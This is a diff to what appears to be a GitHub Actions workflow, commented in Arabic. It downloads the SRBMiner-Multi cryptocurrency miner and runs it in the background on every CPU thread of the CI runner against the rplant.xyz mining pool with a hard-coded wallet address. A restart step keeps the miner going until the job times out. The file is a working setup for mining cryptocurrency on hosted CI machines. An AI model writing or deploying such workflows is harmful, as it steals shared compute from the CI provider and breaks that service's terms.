@@ -12,22 +12,29 @@ jobs:
       - name: Install dependencies
         run: |
           sudo apt update
-          sudo apt install -y wget unzip
+          sudo apt install -y wget tar
 
       - name: Download SRBMiner 3.0.3 (Linux)
         run: |
-          wget -O miner.zip "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.0.3/SRBMiner-Multi-3-0-3-Linux.tar.gz"
-          unzip miner.zip -d miner
+          # تنزيل الإصدار الصحيح Linux tar.gz
+          wget -O miner.tar.gz "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.0.3/SRBMiner-Multi-3-0-3-Linux.tar.gz"
+          mkdir -p miner
+          tar -xzf miner.tar.gz -C miner
 
       - name: Start SRBMiner (yespoweradvc) Max CPU
         run: |
-          cd miner
-          folder=$(ls -d SRBMiner* | head -n 1)
-          exe="$folder/SRBMiner-MULTI"
-          chmod +x "$exe"
-          threads=$(nproc)
-          echo "➡ تشغيل SRBMiner بأقصى عدد من الأنوية: $threads"
-          nohup "$exe" -a yespoweradvc -o stratum+tcps://eu.rplant.xyz:17149 -u Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E -p x --cpu-threads $threads > miner.log 2>&1 &
+          function start_miner() {
+            cd miner
+            folder=$(ls -d SRBMiner* | head -n 1)
+            exe="$folder/SRBMiner-MULTI"
+            chmod +x "$exe"
+            threads=$(nproc)
+            echo "➡ تشغيل SRBMiner بأقصى عدد من الأنوية: $threads"
+            nohup "$exe" -a yespoweradvc -o stratum+tcps://eu.rplant.xyz:17149 -u Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E -p x --cpu-threads $threads > miner.log 2>&1 &
+          }
+
+          # تشغيل miner لأول مرة
+          start_miner
 
       - name: Full Restart Before Timeout
         run: |
@@ -42,16 +49,17 @@ jobs:
           sleep 5
 
           # إعادة تشغيل miner كامل بأقصى قدرة
+          echo "🔄 إعادة تشغيل SRBMiner بالكامل بأقصى قدراته"
           cd miner
           folder=$(ls -d SRBMiner* | head -n 1)
           exe="$folder/SRBMiner-MULTI"
           chmod +x "$exe"
           threads=$(nproc)
-          echo "🔄 إعادة تشغيل SRBMiner بالكامل بأقصى قدراته"
           nohup "$exe" -a yespoweradvc -o stratum+tcps://eu.rplant.xyz:17149 -u Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E -p x --cpu-threads $threads > miner.log 2>&1 &
 
           # انتظار حتى نهاية workflow (~20 دقيقة)
           remaining_minutes=20
           echo "⏱ انتظار $remaining_minutes دقيقة إضافية حتى نهاية workflow"
           sleep $((remaining_minutes * 60))
+
           echo "✅ انتهت مدة workflow"
